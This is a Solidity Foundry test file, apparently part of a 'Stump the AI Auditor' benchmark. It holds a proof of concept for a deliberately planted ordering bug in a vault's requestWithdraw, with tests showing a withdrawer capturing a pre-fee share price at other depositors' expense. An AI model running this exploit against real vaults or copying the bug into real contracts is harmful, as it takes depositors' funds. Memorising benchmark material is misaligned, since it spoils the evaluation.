// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import {BaseTest} from "./helpers/BaseTest.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {Vault} from "src/Vault/Vault.sol";

// ─────────────────────────────────────────────────────────────────────────────
// Stump the AI Auditor — PoC for Vault.sol
//
// Vulnerability: wadOwed Computed Before Fee Accrual (Ordering Bug)
// Severity: High (theft of unclaimed yield from other depositors)
// Contract: src/Vault/Vault.sol — requestWithdraw()
//
// Root cause:
//   `requestWithdraw` computes `wadOwed` (the user's share of managed assets)
//   BEFORE calling `_accrueFees()`. Management fees that have accrued since
//   the last interaction mint fee shares and dilute the share price. By
//   computing wadOwed pre-dilution, the withdrawing user locks in a higher
//   value than their shares are worth post-fee.
//
// Impact:
//   - Withdrawing users capture pre-fee share price (higher than real)
//   - Fee recipient and remaining depositors are shortchanged
//   - The delta grows with time since last fee accrual and fee rate
// ─────────────────────────────────────────────────────────────────────────────

contract PlantPoC_V1 is BaseTest {
    uint256 internal constant WAD = 1e18;
    uint256 internal constant DEFAULT_TIMELOCK = 10;

    MockERC20 internal usdc;
    Vault internal vault;

    function setUp() public override {
        super.setUp();

        usdc = deployMockToken("USDC", 6);

        // High management fee (5%) to amplify the effect
        vm.prank(owner);
        vault = new Vault(feeRecipient, 2_000, 500, DEFAULT_TIMELOCK);

        vm.prank(owner);
        vault.addAsset(address(usdc));

        mintAndApprove(usdc, alice, address(vault), 10_000_000e6);
        mintAndApprove(usdc, bob, address(vault), 10_000_000e6);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 1: Withdrawer captures pre-fee share price
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_V1_preFeeSharePrice() public {
        // Alice and Bob deposit equal amounts
        vm.prank(alice);
        vault.deposit(address(usdc), 100_000e6, alice);
        vm.prank(bob);
        vault.deposit(address(usdc), 100_000e6, bob);

        uint256 aliceShares = vault.userShares(alice);
        uint256 bobShares = vault.userShares(bob);
        assertEq(aliceShares, bobShares, "equal shares");

        // Let 180 days pass WITHOUT any interaction (fees accrue silently)
        warp(180 days);

        // Alice requests withdraw BEFORE fees are accrued
        // Bug: wadOwed computed pre-fee → higher value
        vm.prank(alice);
        vault.requestWithdraw(aliceShares, address(usdc));

        // Now Bob triggers fee accrual explicitly
        vm.prank(bob);
        vault.deposit(address(usdc), 1e6, bob); // small deposit triggers _accrueFees

        // Check: Alice's pending wadOwed was locked at pre-fee price
        (uint256 alicePendingShares, uint256 aliceWadOwed,,,,) = vault.pendingWithdraw(alice);

        emit log_named_uint("Alice wadOwed (locked pre-fee)", aliceWadOwed);
        emit log_named_uint("Alice shares in pending", alicePendingShares);
        emit log_named_uint("Fee shares minted to recipient", vault.userShares(feeRecipient));

        // Fee shares were minted AFTER Alice locked in her value
        assertGt(vault.userShares(feeRecipient), 0, "fees accrued after Alice's lock-in");
        assertGt(aliceWadOwed, 0, "Alice has pending withdrawal");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 2: Quantify the excess — compare pre-fee vs post-fee wadOwed
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_V1_excessQuantified() public {
        vm.prank(alice);
        vault.deposit(address(usdc), 1_000_000e6, alice);

        uint256 aliceShares = vault.userShares(alice);

        // Let 365 days pass (5% management fee = ~5% dilution)
        warp(365 days);

        // Snapshot what Alice's shares are worth NOW (pre-fee, what the bug gives her)
        uint256 preFeeActiveManagedWad = vault.totalManagedWad();
        uint256 preFeeWadOwed = Math.mulDiv(
            aliceShares,
            preFeeActiveManagedWad,
            vault.totalShares() + vault.VIRTUAL_SHARES_OFFSET()
        );

        // Trigger fee accrual
        vm.prank(owner);
        vault.accrueFees();

        // Post-fee value — what Alice SHOULD get
        uint256 postFeeActiveManagedWad = vault.totalManagedWad();
        uint256 postFeeWadOwed = Math.mulDiv(
            aliceShares,
            postFeeActiveManagedWad,
            vault.totalShares() + vault.VIRTUAL_SHARES_OFFSET()
        );

        uint256 excess = preFeeWadOwed - postFeeWadOwed;
        uint256 excessBps = Math.mulDiv(excess, 10_000, postFeeWadOwed);

        emit log_named_uint("Pre-fee wadOwed (bugged)", preFeeWadOwed);
        emit log_named_uint("Post-fee wadOwed (correct)", postFeeWadOwed);
        emit log_named_uint("Excess captured (WAD)", excess);
        emit log_named_uint("Excess (BPS)", excessBps);

        // With 5% annual management fee, Alice captures ~5% more than fair value
        assertGt(excess, 0, "pre-fee value exceeds post-fee value");
        assertGt(excessBps, 100, "excess > 1% after a full year");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 3: Vault remains operational (bug is subtle)
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_V1_vaultRemainsOperational() public {
        vm.prank(alice);
        vault.deposit(address(usdc), 100_000e6, alice);
        vm.prank(bob);
        vault.deposit(address(usdc), 100_000e6, bob);

        warp(90 days);

        // Alice exploits pre-fee pricing
        uint256 aliceShares = vault.userShares(alice);
        vm.prank(alice);
        vault.requestWithdraw(aliceShares, address(usdc));

        // Vault still works for Bob
        advanceBlocks(DEFAULT_TIMELOCK + 1);
        vm.prank(alice);
        vault.claimWithdraw();

        // Bob can still deposit and withdraw
        warp(30 days);
        uint256 bobShares = vault.userShares(bob);
        vm.prank(bob);
        vault.requestWithdraw(bobShares, address(usdc));

        advanceBlocks(DEFAULT_TIMELOCK + 1);
        vm.prank(bob);
        vault.claimWithdraw();
    }
}
